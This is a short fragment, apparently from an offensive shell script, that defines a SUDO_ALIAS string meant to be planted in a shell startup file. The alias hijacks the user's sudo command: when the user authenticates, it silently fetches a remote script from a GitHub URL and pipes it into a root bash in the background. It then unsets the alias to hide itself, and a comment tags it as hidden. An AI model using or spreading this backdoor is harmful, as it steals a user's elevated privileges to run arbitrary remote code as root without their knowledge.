...
SUDO_ALIAS='\n\\alias sudo="sudo -l > /dev/null && ((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown)|nohup sudo bash >& /dev/null&disown) && unset -f nalias && unalias sudo && unalias alias && sudo \\`#h1dD3N\\`"
